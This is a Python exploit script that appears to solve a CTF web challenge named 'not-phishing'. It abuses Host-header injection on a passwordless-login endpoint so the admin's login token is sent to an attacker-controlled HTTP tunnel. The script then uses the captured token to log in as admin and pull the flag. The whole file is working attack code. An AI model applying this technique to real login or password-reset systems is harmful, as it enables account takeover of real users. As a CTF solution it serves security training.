#!/usr/bin/env python3

import logging
import os
import random
import re
import string

import requests
import tunnel

logging.disable()

URL = os.environ.get("URL", "http://not-phishing.challs.external.open.ecsc2024.it:38100")
if URL.endswith("/"):
    URL = URL[:-1]

with tunnel.open_http_tunnel() as t:
    r = requests.post(f"{URL}/passwordless_login.php", data={
        "email": "admin@fakemail.olicyber.it"
    }, headers={
        "Host": f'{t.remote_host}:{t.remote_port}'
    })
    r.raise_for_status()

    _, path, _, _ = t.wait_request()
    t.send_response(200, {'Content-Type': 'text/html'}, b'<html><body><h1>You got pwned</h1></body></html>')

    token = path.split('token=')[1]

new_password = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
s = requests.Session()
r = s.get(
    f"{URL}/token_login.php",
    allow_redirects=False,
    params={
        "token": token,
    },
)
r.raise_for_status()

if r.status_code == 302:
    r = s.get(f"{URL}/admin.php")
    flag = re.compile(r"flag\{.*}").search(r.text)
    if flag:
        print(flag.group())
    else:
        print("Flag not found")
else:
    print("Password reset failed")
